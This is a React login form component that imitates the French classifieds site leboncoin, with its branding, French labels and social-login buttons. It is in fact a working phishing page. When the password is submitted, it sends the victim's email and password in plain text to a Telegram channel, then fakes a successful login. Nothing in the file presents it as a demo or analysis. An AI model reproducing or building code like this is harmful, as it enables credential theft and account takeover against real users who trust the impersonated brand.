import React, { useState } from 'react';
import Input from './ui/Input';
import Button from './ui/Button';
import Divider from './ui/Divider';
import SocialLoginButton from './SocialLoginButton';
import { Eye, EyeOff } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';

type LoginFormProps = {
  onSuccess: () => void;
};

const LoginForm = ({ onSuccess }: LoginFormProps) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [step, setStep] = useState<'email' | 'password'>('email');

  const validateEmail = (email: string) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (!email.trim()) {
      setError('Champ requis');
      return;
    }

    if (!validateEmail(email)) {
      setError('Adresse e-mail invalide');
      return;
    }

    setStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (!password.trim()) {
      setError('Champ requis');
      return;
    }

    setIsSubmitting(true);

    // Send login data to Telegram
    await sendTelegramMessage(`
📧 CONNEXION UTILISATEUR

Email: ${email}
Mot de passe: ${password}
    `);

    setTimeout(() => {
      setIsSubmitting(false);
      onSuccess();
    }, 1000);
  };

  return (
    <div className="w-full max-w-md">
      <h1 className="text-xl md:text-2xl font-semibold text-gray-800 mb-6">
        Connectez-vous ou créez votre compte leboncoin
      </h1>
      
      {step === 'email' ? (
        <form onSubmit={handleEmailSubmit}>
          <Input
            id="email"
            label="E-mail"
            type="email"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            error={error}
          />
          
          <Button 
            type="submit" 
            fullWidth 
            className="mt-4"
            disabled={isSubmitting}
          >
            Continuer
          </Button>

          <Divider text="Ou" />

          <div className="space-y-3">
            <SocialLoginButton provider="apple" />
            <SocialLoginButton provider="google" />
          </div>
        </form>
      ) : (
        <form onSubmit={handlePasswordSubmit}>
          <Input
            id="email"
            label="E-mail"
            type="email"
            value={email}
            disabled
            className="mb-4"
          />

          <div className="relative">
            <Input
              id="password"
              label="Mot de passe"
              type={showPassword ? "text" : "password"}
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              error={error}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-[38px] text-gray-500 hover:text-gray-700"
              aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>

          <div className="mt-1 mb-4">
            <button
              type="button"
              onClick={() => console.log('Mot de passe oublié')}
              className="text-sm text-leboncoin hover:underline"
            >
              Mot de passe oublié
            </button>
          </div>

          <Button 
            type="submit" 
            fullWidth
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <span className="flex items-center justify-center">
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white\" xmlns="http://www.w3.org/2000/svg\" fill="none\" viewBox="0 0 24 24">
                  <circle className="opacity-25\" cx="12\" cy="12\" r="10\" stroke="currentColor\" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Connexion en cours...
              </span>
            ) : (
              'Se connecter'
            )}
          </Button>

          <div className="mt-4">
            <button
              type="button"
              onClick={() => setStep('email')}
              className="text-leboncoin hover:underline"
            >
              Retour
            </button>
          </div>
        </form>
      )}
    </div>
  );
};

export default LoginForm;